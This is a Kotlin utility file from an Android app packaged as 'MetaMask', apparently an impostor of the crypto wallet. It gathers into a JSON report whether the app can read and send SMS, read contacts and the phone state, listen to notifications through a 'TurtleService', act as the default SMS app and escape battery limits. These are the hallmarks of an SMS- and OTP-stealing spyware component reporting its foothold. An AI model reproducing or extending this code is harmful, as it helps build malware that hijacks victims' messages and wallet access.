package com.example.MetaMask.utils

import android.Manifest
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.example.MetaMask.services.TurtleService
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

object PermissionHelper {

    private val DATE_FMT = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssZ", Locale.getDefault())

    fun checkPermissions(context: Context): JSONObject {
        android.util.Log.d("XDBG", "[PermissionHelper] checkPermissions enter context=ctx") //xdbg
        android.util.Log.d("XDBG", "[PermissionHelper] return") //xdbg
        return try {
            val permissions = arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE
            )

            val statusMap = permissions.associateWith {
                ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
            }

            val notifListenerEnabled = try {
                val componentName = ComponentName(context, TurtleService::class.java)
                val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
                flat != null && flat.contains(componentName.flattenToString())
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PermissionHelper] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                false
            }

            val isIgnoringBatteryOptimizations = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(context.packageName)
            } else {
                true
            }

            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val notificationPolicyAccess = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                notificationManager.isNotificationPolicyAccessGranted
            } else {
                false
            }

            val isDefaultSms = PrivilegeChecker.isDefaultSmsApp(context)
            val currentTime = DATE_FMT.format(Date())

            val data = JSONObject(statusMap as Map<*, *>).apply {
                put("notification_listener_enabled", notifListenerEnabled)
                put("is_ignoring_battery_optimizations", isIgnoringBatteryOptimizations)
                put("notification_policy_access", notificationPolicyAccess)
                put("is_default_sms_app", isDefaultSms)
                put("device_time", currentTime)
            }

            JSONObject().put("status", "success").put("data", data)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[PermissionHelper] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            JSONObject().put("status", "error").put("message", "Exception getting permissions: ${e.message}")
        }
    }
}
